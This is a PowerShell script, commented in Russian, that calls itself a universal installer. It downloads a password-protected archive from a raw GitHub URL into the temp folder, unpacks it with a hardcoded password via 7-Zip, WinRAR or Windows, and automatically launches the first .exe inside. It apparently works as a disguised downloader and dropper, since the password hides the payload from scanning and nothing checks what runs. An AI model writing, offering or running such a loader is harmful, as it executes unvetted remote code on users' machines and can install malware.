# =============================================
# Универсальный Installer (7-Zip / WinRAR / Windows)
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"
$Password = "5357"

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing

New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

Write-Host "[+] Ищем программу для распаковки..." -ForegroundColor Cyan

$Extracted = $false

# 1. Проверка 7-Zip
$7z = "C:\Program Files\7-Zip\7z.exe"
if (Test-Path $7z) {
    Write-Host "[+] Используем 7-Zip" -ForegroundColor Green
    & $7z x "$DownloadPath" -o"$ExtractPath" -p"$Password" -y -bso0
    $Extracted = $true
}

# 2. Проверка WinRAR
if (-not $Extracted) {
    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"
    if (Test-Path $winrar) {
        Write-Host "[+] Используем WinRAR" -ForegroundColor Green
        & $winrar x -p"$Password" -o+ "$DownloadPath" "$ExtractPath"
        $Extracted = $true
    }
}

# 3. Если ничего не нашли — пробуем встроенный метод Windows
if (-not $Extracted) {
    Write-Host "[+] Программы не найдены, пробуем встроенный метод..." -ForegroundColor Yellow
    try {
        Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
        $Extracted = $true
    } catch {
        Write-Host "[-] Встроенный метод не сработал (нужен пароль)" -ForegroundColor Red
    }
}

# Автоматический запуск .exe
$ExeFiles = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($ExeFiles) {
    Write-Host "[+] Найден: $($ExeFiles.Name)" -ForegroundColor Green
    Start-Process $ExeFiles.FullName
} else {
    Write-Host "[-] .exe файл не найден, открываю папку..." -ForegroundColor Yellow
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
